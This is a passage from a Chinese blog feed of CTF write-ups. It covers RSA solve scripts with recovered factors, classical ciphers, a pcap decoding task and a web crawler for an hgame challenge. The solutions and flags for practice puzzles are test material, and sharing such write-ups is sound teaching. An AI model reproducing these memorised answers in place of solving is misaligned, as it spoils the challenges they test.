class="hljs-built_in">int</span>(m[i:i+<span class="hljs-number">2</span>]))<br>        i+=<span class="hljs-number">2</span><br>    flag+=c<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>m是ASCII码拼接而成！！</p><hr><h2 id="羊城杯-2020-RRRRRRRSA"><a href="#羊城杯-2020-RRRRRRRSA" class="headerlink" title="[羊城杯 2020]RRRRRRRSA"></a>[羊城杯 2020]RRRRRRRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">&#x27;GWHT&#123;************&#125;&#x27;</span><br><br>flag1 = flag[:<span class="hljs-number">19</span>].encode()<br>flag2 = flag[<span class="hljs-number">19</span>:].encode()<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">38</span>)<br><br>P1 = getPrime(<span class="hljs-number">1038</span>)<br>P2 = sympy.nextprime(P1)<br><span class="hljs-keyword">assert</span>(P2 - P1 &lt; <span class="hljs-number">1000</span>)<br><br>Q1 = getPrime(<span class="hljs-number">512</span>)<br>Q2 = sympy.nextprime(Q1)<br><br>N1 = P1 * P1 * Q1<br>N2 = P2 * P2 * Q2<br><br>E1 = getPrime(<span class="hljs-number">1024</span>)<br>E2 = sympy.nextprime(E1)<br><br>m1 = bytes_to_long(flag1)<br>m2 = bytes_to_long(flag2)<br><br>c1 = <span class="hljs-built_in">pow</span>(m1, E1, N1)<br>c2 = <span class="hljs-built_in">pow</span>(m2, E2, N2)<br>N1=<span class="hljs-number">60143104944034567859993561862949071559877219267755259679749062284763163484947626697494729046430386559610613113754453726683312513915610558734802079868190554644983911078936369464590301246394586190666760362763580192139772729890492729488892169933099057105842090125200369295070365451134781912223048179092058016446222199742919885472867511334714233086339832790286482634562102936600597781342756061479024744312357407750731307860842457299116947352106025529309727703385914891200109853084742321655388368371397596144557614128458065859276522963419738435137978069417053712567764148183279165963454266011754149684758060746773409666706463583389316772088889398359242197165140562147489286818190852679930372669254697353483887004105934649944725189954685412228899457155711301864163839538810653626724347</span><br>c1=<span class="hljs-number">55094296873556883585060020895253176070835143350249581136609315815308788255684072804968957510292559743192424646169207794748893753882418256401223641287546922358162629295622258913168323493447075410872354874300793298956869374606043622559405978242734950156459436487837698668489891733875650048466360950142617732135781244969524095348835624828008115829566644654403962285001724209210887446203934276651265377137788183939798543755386888532680013170540716736656670269251318800501517579803401154996881233025210176293554542024052540093890387437964747460765498713092018160196637928204190194154199389276666685436565665236397481709703644555328705818892269499380797044554054118656321389474821224725533693520856047736578402581854165941599254178019515615183102894716647680969742744705218868455450832</span><br>E1=<span class="hljs-number">125932919717342481428108392434488550259190856475011752106073050593074410065655587870702051419898088541590032209854048032649625269856337901048406066968337289491951404384300466543616578679539808215698754491076340386697518948419895268049696498272031094236309803803729823608854215226233796069683774155739820423103</span><br>N2=<span class="hljs-number">60143104944034567859993561862949071559877219267755259679749062284763163484947626697494729046430386559610613113754453726683312513915610558734802079868195633647431732875392121458684331843306730889424418620069322578265236351407591029338519809538995249896905137642342435659572917714183543305243715664380787797562011006398730320980994747939791561885622949912698246701769321430325902912003041678774440704056597862093530981040696872522868921139041247362592257285423948870944137019745161211585845927019259709501237550818918272189606436413992759328318871765171844153527424347985462767028135376552302463861324408178183842139330244906606776359050482977256728910278687996106152971028878653123533559760167711270265171441623056873903669918694259043580017081671349232051870716493557434517579121</span><br>c2=<span class="hljs-number">39328446140156257571484184713861319722905864197556720730852773059147902283123252767651430278357950872626778348596897711320942449693270603776870301102881405303651558719085454281142395652056217241751656631812580544180434349840236919765433122389116860827593711593732385562328255759509355298662361508611531972386995239908513273236239858854586845849686865360780290350287139092143587037396801704351692736985955152935601987758859759421886670907735120137698039900161327397951758852875291442188850946273771733011504922325622240838288097946309825051094566685479503461938502373520983684296658971700922069426788236476575236189040102848418547634290214175167767431475003216056701094275899211419979340802711684989710130215926526387138538819531199810841475218142606691152928236362534181622201347</span><br>E2=<span class="hljs-number">125932919717342481428108392434488550259190856475011752106073050593074410065655587870702051419898088541590032209854048032649625269856337901048406066968337289491951404384300466543616578679539808215698754491076340386697518948419895268049696498272031094236309803803729823608854215226233796069683774155739820425393</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br>N1=<span class="hljs-number">60143104944034567859993561862949071559877219267755259679749062284763163484947626697494729046430386559610613113754453726683312513915610558734802079868190554644983911078936369464590301246394586190666760362763580192139772729890492729488892169933099057105842090125200369295070365451134781912223048179092058016446222199742919885472867511334714233086339832790286482634562102936600597781342756061479024744312357407750731307860842457299116947352106025529309727703385914891200109853084742321655388368371397596144557614128458065859276522963419738435137978069417053712567764148183279165963454266011754149684758060746773409666706463583389316772088889398359242197165140562147489286818190852679930372669254697353483887004105934649944725189954685412228899457155711301864163839538810653626724347</span><br>c1=<span class="hljs-number">55094296873556883585060020895253176070835143350249581136609315815308788255684072804968957510292559743192424646169207794748893753882418256401223641287546922358162629295622258913168323493447075410872354874300793298956869374606043622559405978242734950156459436487837698668489891733875650048466360950142617732135781244969524095348835624828008115829566644654403962285001724209210887446203934276651265377137788183939798543755386888532680013170540716736656670269251318800501517579803401154996881233025210176293554542024052540093890387437964747460765498713092018160196637928204190194154199389276666685436565665236397481709703644555328705818892269499380797044554054118656321389474821224725533693520856047736578402581854165941599254178019515615183102894716647680969742744705218868455450832</span><br>E1=<span class="hljs-number">125932919717342481428108392434488550259190856475011752106073050593074410065655587870702051419898088541590032209854048032649625269856337901048406066968337289491951404384300466543616578679539808215698754491076340386697518948419895268049696498272031094236309803803729823608854215226233796069683774155739820423103</span><br>p1=<span class="hljs-number">11628371843051760370952910026406764366191062991235308941262037248377376991693250742343307155422036713746576338866595433599862614339347536916226536644210947</span><br>q1=<span class="hljs-number">2274225198252001349705635635570523977229824105257244100474886998299874359980121470818908135119780772090534507154122446275044273088642034569778714650980895003300783785404556303992237495059194352539844239687490397036174178433587393753764414486675415691276936408808667228951877003555601842900641222777857711016758899</span><br><span class="hljs-built_in">print</span>(q1*q1*p1==N1)<br>phi1=(q1-<span class="hljs-number">1</span>)*q1*(p1-<span class="hljs-number">1</span>)<br>d1=gmpy2.invert(E1,phi1)<br>m1=<span class="hljs-built_in">pow</span>(c1,d1,N1)<br>flag1=libnum.n2s(<span class="hljs-built_in">int</span>(m1))<br><br>N2=<span class="hljs-number">60143104944034567859993561862949071559877219267755259679749062284763163484947626697494729046430386559610613113754453726683312513915610558734802079868195633647431732875392121458684331843306730889424418620069322578265236351407591029338519809538995249896905137642342435659572917714183543305243715664380787797562011006398730320980994747939791561885622949912698246701769321430325902912003041678774440704056597862093530981040696872522868921139041247362592257285423948870944137019745161211585845927019259709501237550818918272189606436413992759328318871765171844153527424347985462767028135376552302463861324408178183842139330244906606776359050482977256728910278687996106152971028878653123533559760167711270265171441623056873903669918694259043580017081671349232051870716493557434517579121</span><br>c2=<span class="hljs-number">39328446140156257571484184713861319722905864197556720730852773059147902283123252767651430278357950872626778348596897711320942449693270603776870301102881405303651558719085454281142395652056217241751656631812580544180434349840236919765433122389116860827593711593732385562328255759509355298662361508611531972386995239908513273236239858854586845849686865360780290350287139092143587037396801704351692736985955152935601987758859759421886670907735120137698039900161327397951758852875291442188850946273771733011504922325622240838288097946309825051094566685479503461938502373520983684296658971700922069426788236476575236189040102848418547634290214175167767431475003216056701094275899211419979340802711684989710130215926526387138538819531199810841475218142606691152928236362534181622201347</span><br>E2=<span class="hljs-number">125932919717342481428108392434488550259190856475011752106073050593074410065655587870702051419898088541590032209854048032649625269856337901048406066968337289491951404384300466543616578679539808215698754491076340386697518948419895268049696498272031094236309803803729823608854215226233796069683774155739820425393</span><br>p2=<span class="hljs-number">11628371843051760370952910026406764366191062991235308941262037248377376991693250742343307155422036713746576338866595433599862614339347536916226536644211929</span><br>q2=<span class="hljs-number">2274225198252001349705635635570523977229824105257244100474886998299874359980121470818908135119780772090534507154122446275044273088642034569778714650980895003300783785404556303992237495059194352539844239687490397036174178433587393753764414486675415691276936408808667228951877003555601842900641222777857711016759643</span><br><span class="hljs-built_in">print</span>(p2*q2*q2==N2)<br>phi2=(q2-<span class="hljs-number">1</span>)*q2*(p2-<span class="hljs-number">1</span>)<br>d2=gmpy2.invert(E2,phi2)<br>m2=<span class="hljs-built_in">pow</span>(c2,d2,N2)<br>flag2=libnum.n2s(<span class="hljs-built_in">int</span>(m2))<br><span class="hljs-built_in">print</span>(flag1+flag2)<br></code></pre></td></tr></table></figure><p><code>N=p**2*q**3*r**5*t**7*</code><br><code>phi=(p-1)*p*q**2*(q-1)*r**4*(r-1)*t**6*(t-1)</code><br>其他没有变化，正常计算即可</p><p>这一题也是如此</p><hr><h2 id="buu-凯撒？替换？呵呵"><a href="#buu-凯撒？替换？呵呵" class="headerlink" title="buu-凯撒？替换？呵呵!"></a>buu-凯撒？替换？呵呵!</h2><p><code>MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125; </code></p><p><img src="/picture/za11.png"></p><p><img src="/picture/za12.png"></p><p><a href="https://quipqiup.com/">quipqiup - cryptoquip and cryptogram solver</a></p><hr><h2 id="buu-old-fashion"><a href="#buu-old-fashion" class="headerlink" title="buu-old-fashion"></a>buu-old-fashion</h2><p><img src="/picture/za13.png"><br>没有一点提示，同样猜测是替换<br>用上一题的在线工具解密<br><img src="/picture/za14.png"></p><hr><h2 id="buu-世上无难事"><a href="#buu-世上无难事" class="headerlink" title="buu-世上无难事"></a>buu-世上无难事</h2><p><img src="/picture/za15.png"></p><p><img src="/picture/za16.png"></p><p>还原成通顺的话，同样想到刚才的网站，解密即可</p><hr><h2 id="2018-网鼎杯-第3场-Crypto-track-hacker"><a href="#2018-网鼎杯-第3场-Crypto-track-hacker" class="headerlink" title="2018-网鼎杯-第3场-Crypto-track_hacker"></a>2018-网鼎杯-第3场-Crypto-track_hacker</h2><p>pcap文件，导出http</p><p><img src="/picture/za1.png"></p><p>唯一有意义的一段php，可以看到<br>gzcompress，进行了压缩</p><p><img src="/picture/za3.png"></p><p>追踪流得到flag.txt的内容，是base64加密的，但发现直接解密解不出，因为被压缩了</p><p><img src="/picture/za2.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$st</span> = <span class="hljs-string">&quot;eJxLy0lMrw6NTzPMS4n3TVWsBQAz4wXi&quot;</span>;<br><span class="hljs-variable">$st</span> = gzuncompress(base64_decode(<span class="hljs-variable">$st</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$st</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解压缩解密得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#用python也可以进行解压缩，但好像有点问题</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br>flag=<span class="hljs-string">&#x27;eJxLy0lMrw6NTzPMS4n3TVWsBQAz4wXi&#x27;</span><br>zlib.decompress(flag.decode(<span class="hljs-string">&#x27;base64&#x27;</span>))<br></code></pre></td></tr></table></figure><hr><h2 id="2018-网鼎杯-第3场-Crypto-Not-only-base"><a href="#2018-网鼎杯-第3场-Crypto-Not-only-base" class="headerlink" title="2018-网鼎杯-第3场-Crypto-Not_only_base"></a>2018-网鼎杯-第3场-Crypto-Not_only_base</h2><p><code>MCJIJSGKP=ZZYXZXRMU=W3YZG3ZZ==G3HQHCUS==</code><br>先栏栅解密，等号必须在后面</p><p><img src="/picture/za4.png"></p><p>所以5栏的时候，再进行base32解密(原来后面有很多个等号也可以进行base解密啊)</p><hr><h2 id="ctfshow-萌新-密码3"><a href="#ctfshow-萌新-密码3" class="headerlink" title="ctfshow-萌新 密码3"></a>ctfshow-萌新 密码3</h2><p>这个题目是有疑惑的</p><p>– — .-. … . ..–.- .. … ..–.- -.-. — — .-.. ..–.- -… ..- - ..–.- -… .- -.-. — -. ..–.- .. … ..–.- -.-. — — .-.. . .-. ..–.- – – -.. -.. – -.. – -.. – – – -.. -.. -.. /– -.. – -.. -.. –/ – – – – – /– -.. -.. – -.. – /– -.. -.. –<br>这个morse密码我确实有点懵，因为感觉它既有空格又有/<br>因为morse密码是由长、短、分隔 组成的，但是这一串编码他就有了四个<br><a href="http://moersima.00cha.net/">解密网址</a>，这个网站是自动用空格作为分隔的，就可以解出来</p><hr><h2 id="ctfshow-萌新-密码-4"><a href="#ctfshow-萌新-密码-4" class="headerlink" title="ctfshow-萌新 密码#4"></a>ctfshow-萌新 密码#4</h2><p>Ao(mgHX^E)ARAnTF(J]f@&amp;lt;6”.<br>注意看这个<code>\&amp;lt;</code>    是html特殊字符 &lt;<br>需要替换之后再进行base85解码</p><hr><h2 id="WUSTCTF2020-佛说：只能四天"><a href="#WUSTCTF2020-佛说：只能四天" class="headerlink" title="[WUSTCTF2020]佛说：只能四天"></a>[WUSTCTF2020]佛说：只能四天</h2><p>凯撒默认是移3位<br>记录这一题是想说，随波逐流这个软件并不一定正确，这一题解base32时，软件解不出来<br>可以使用basecrack.py (金盾杯那篇文章有说明)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2020-BJDCTF-Crypto-rsa&quot;&gt;&lt;a href=&quot;#2020-BJDCTF-Crypto-rsa&quot; class=&quot;headerlink&quot; title=&quot;2020-BJDCTF-Crypto-rsa&quot;&gt;&lt;/a&gt;2020-BJDCTF-Crypto-r</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>hagme线上赛</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/06/hagme%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/06/hagme%E7%BA%BF%E4%B8%8A%E8%B5%9B/</id>
    <published>2022-02-06T14:06:17.000Z</published>
    <updated>2022-02-06T14:07:24.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、Easy-RSA"><a href="#1、Easy-RSA" class="headerlink" title="1、Easy RSA"></a>1、Easy RSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#题目所给代码</span><br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> gcd<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">c</span>):</span><br>    p = getPrime(<span class="hljs-number">8</span>)<br>    q = getPrime(<span class="hljs-number">8</span>)<br>    e = randint(<span class="hljs-number">0</span>, p * q)<br>    <span class="hljs-keyword">while</span> gcd(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)) != <span class="hljs-number">1</span>:<br>        e = <span class="hljs-built_in">int</span>(next_prime(e))<br>    <span class="hljs-keyword">return</span> e, p, q, <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">ord</span>(c), e, p * q)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(encrypt, flag)))<br>    <span class="hljs-comment"># [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)]</span><br></code></pre></td></tr></table></figure><p>map(func, seq1[, seq2,…])<br>第一个参数接受一个函数名，后面的参数接受一个或多个可迭代的序列，返回的是一个集合。<br>Python函数编程中的map()函数是将func作用于seq中的每一个元素，并将所有的调用的结果作为一个list返回。如果func为None，作用同zip()。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>x=[(<span class="hljs-number">12433</span>, <span class="hljs-number">149</span>, <span class="hljs-number">197</span>, <span class="hljs-number">104</span>), (<span class="hljs-number">8147</span>, <span class="hljs-number">131</span>, <span class="hljs-number">167</span>, <span class="hljs-number">6633</span>), (<span class="hljs-number">10687</span>, <span class="hljs-number">211</span>, <span class="hljs-number">197</span>, <span class="hljs-number">35594</span>), (<span class="hljs-number">19681</span>, <span class="hljs-number">131</span>, <span class="hljs-number">211</span>, <span class="hljs-number">15710</span>), (<span class="hljs-number">33577</span>, <span class="hljs-number">251</span>, <span class="hljs-number">211</span>, <span class="hljs-number">38798</span>), (<span class="hljs-number">30241</span>, <span class="hljs-number">157</span>, <span class="hljs-number">251</span>, <span class="hljs-number">35973</span>), (<span class="hljs-number">293</span>, <span class="hljs-number">211</span>, <span class="hljs-number">157</span>, <span class="hljs-number">31548</span>), (<span class="hljs-number">26459</span>, <span class="hljs-number">179</span>, <span class="hljs-number">149</span>, <span class="hljs-number">4778</span>), (<span class="hljs-number">27479</span>, <span class="hljs-number">149</span>, <span class="hljs-number">223</span>, <span class="hljs-number">32728</span>), (<span class="hljs-number">9029</span>, <span class="hljs-number">223</span>, <span class="hljs-number">137</span>, <span class="hljs-number">20696</span>), (<span class="hljs-number">4649</span>, <span class="hljs-number">149</span>, <span class="hljs-number">151</span>, <span class="hljs-number">13418</span>), (<span class="hljs-number">11783</span>, <span class="hljs-number">223</span>, <span class="hljs-number">251</span>, <span class="hljs-number">14239</span>), (<span class="hljs-number">13537</span>, <span class="hljs-number">179</span>, <span class="hljs-number">137</span>, <span class="hljs-number">11702</span>), (<span class="hljs-number">3835</span>, <span class="hljs-number">167</span>, <span class="hljs-number">139</span>, <span class="hljs-number">20051</span>), (<span class="hljs-number">30983</span>, <span class="hljs-number">149</span>, <span class="hljs-number">227</span>, <span class="hljs-number">23928</span>), (<span class="hljs-number">17581</span>, <span class="hljs-number">157</span>, <span class="hljs-number">131</span>, <span class="hljs-number">5855</span>), (<span class="hljs-number">35381</span>, <span class="hljs-number">223</span>, <span class="hljs-number">179</span>, <span class="hljs-number">37774</span>), (<span class="hljs-number">2357</span>, <span class="hljs-number">151</span>, <span class="hljs-number">223</span>, <span class="hljs-number">1849</span>), (<span class="hljs-number">22649</span>, <span class="hljs-number">211</span>, <span class="hljs-number">229</span>, <span class="hljs-number">7348</span>), (<span class="hljs-number">1151</span>, <span class="hljs-number">179</span>, <span class="hljs-number">223</span>, <span class="hljs-number">17982</span>), (<span class="hljs-number">8431</span>, <span class="hljs-number">251</span>, <span class="hljs-number">163</span>, <span class="hljs-number">30226</span>), (<span class="hljs-number">38501</span>, <span class="hljs-number">193</span>, <span class="hljs-number">211</span>, <span class="hljs-number">30559</span>), (<span class="hljs-number">14549</span>, <span class="hljs-number">211</span>, <span class="hljs-number">151</span>, <span class="hljs-number">21143</span>), (<span class="hljs-number">24781</span>, <span class="hljs-number">239</span>, <span class="hljs-number">241</span>, <span class="hljs-number">45604</span>), (<span class="hljs-number">8051</span>, <span class="hljs-number">179</span>, <span class="hljs-number">131</span>, <span class="hljs-number">7994</span>), (<span class="hljs-number">863</span>, <span class="hljs-number">181</span>, <span class="hljs-number">131</span>, <span class="hljs-number">11493</span>), (<span class="hljs-number">1117</span>, <span class="hljs-number">239</span>, <span class="hljs-number">157</span>, <span class="hljs-number">12579</span>), (<span class="hljs-number">7561</span>, <span class="hljs-number">149</span>, <span class="hljs-number">199</span>, <span class="hljs-number">8960</span>), (<span class="hljs-number">19813</span>, <span class="hljs-number">239</span>, <span class="hljs-number">229</span>, <span class="hljs-number">53463</span>), (<span class="hljs-number">4943</span>, <span class="hljs-number">131</span>, <span class="hljs-number">157</span>, <span class="hljs-number">14606</span>), (<span class="hljs-number">29077</span>, <span class="hljs-number">191</span>, <span class="hljs-number">181</span>, <span class="hljs-number">33446</span>), (<span class="hljs-number">18583</span>, <span class="hljs-number">211</span>, <span class="hljs-number">163</span>, <span class="hljs-number">31800</span>), (<span class="hljs-number">30643</span>, <span class="hljs-number">173</span>, <span class="hljs-number">191</span>, <span class="hljs-number">27293</span>), (<span class="hljs-number">11617</span>, <span class="hljs-number">223</span>, <span class="hljs-number">251</span>, <span class="hljs-number">13448</span>), (<span class="hljs-number">19051</span>, <span class="hljs-number">191</span>, <span class="hljs-number">151</span>, <span class="hljs-number">21676</span>), (<span class="hljs-number">18367</span>, <span class="hljs-number">179</span>, <span class="hljs-number">157</span>, <span class="hljs-number">14139</span>), (<span class="hljs-number">18861</span>, <span class="hljs-number">149</span>, <span class="hljs-number">191</span>, <span class="hljs-number">5139</span>), (<span class="hljs-number">9581</span>, <span class="hljs-number">211</span>, <span class="hljs-number">193</span>, <span class="hljs-number">25595</span>)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>    e=i[<span class="hljs-number">0</span>]<br>    p=i[<span class="hljs-number">1</span>]<br>    q=i[<span class="hljs-number">2</span>]<br>    m=i[<span class="hljs-number">3</span>]<br>    phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>    d=gmpy2.invert(e,phi)<br>    c=<span class="hljs-built_in">pow</span>(m,d,p*q)<br>    <span class="hljs-built_in">print</span>(c,end=<span class="hljs-string">&#x27; &#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到104 103 97 109 101 123 76 48 48 107 115 95 108 49 107 101 95 121 48 117 39 118 101 95 109 97 115 116 101 114 101 100 95 82 83 52 33 125<br>推测是Ascii码<br><img src="https://img-blog.csdnimg.cn/bca2d223a1774ecfa14b27d4be157a6c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到flag</p><hr><h2 id="2、蛛蛛…嘿嘿♥我的蛛蛛"><a href="#2、蛛蛛…嘿嘿♥我的蛛蛛" class="headerlink" title="2、蛛蛛…嘿嘿♥我的蛛蛛"></a>2、蛛蛛…嘿嘿♥我的蛛蛛<img src="https://img-blog.csdnimg.cn/f04760fc3b13453eaa1d449c2e8d4903.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></h2><p><img src="https://img-blog.csdnimg.cn/f62c71255d0c41108ee446d359608d08.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看源码，会有一个url按钮是通往下一关的，关卡很多，加上题目提示spider，编写爬虫程序<br><img src="https://img-blog.csdnimg.cn/07d23598fa5e4403bb2e6f8a1a5e3708.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.62&#x27;</span><br>    &#125;<br>    url = <span class="hljs-string">&#x27;https://hgame-spider.vidar.club/99c9a3a283&#x27;</span><br>    response = requests.get(url=url, headers=headers)<br>    page_text = response.text<br>    tree = etree.HTML(page_text)<br>    r = tree.xpath(<span class="hljs-string">&#x27;//a/@href&#x27;</span>)<br>    x=url<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ifHas</span>(<span class="hljs-params"><span class="hljs-built_in">list</span></span>):</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>            <span class="hljs-keyword">if</span> i!=<span class="hljs-string">&#x27;&#x27;</span>:<br>                <span class="hljs-keyword">return</span> i<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">while</span>(ifHas(r)!=<span class="hljs-literal">None</span>):<br>        url=<span class="hljs-string">&#x27;https://hgame-spider.vidar.club/dc947845b2&#x27;</span>+ifHas(r)<br>        response = requests.get(url=url, headers=headers)<br>        page_text = response.text<br>        tree = etree.HTML(page_text)<br>        r = tree.xpath(<span class="hljs-string">&#x27;//a/@href&#x27;</span>)<br>        x=url<br>        <span class="hljs-built_in">print</span>(x)<br><br></code></pre></td></tr></table></figure><p>运行，拿到最后一个url<br><img src="https://img-blog.csdnimg.cn/e2be056a892a40e4844e5cbe478d8031.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/4830eaa1e9e74509b5faab6a67b4bb89.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那就找一找<br><img src="https://img-blog.csdnimg.cn/12131f8b93e54476a27e362c08a4374f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>找到了</p><hr><h2 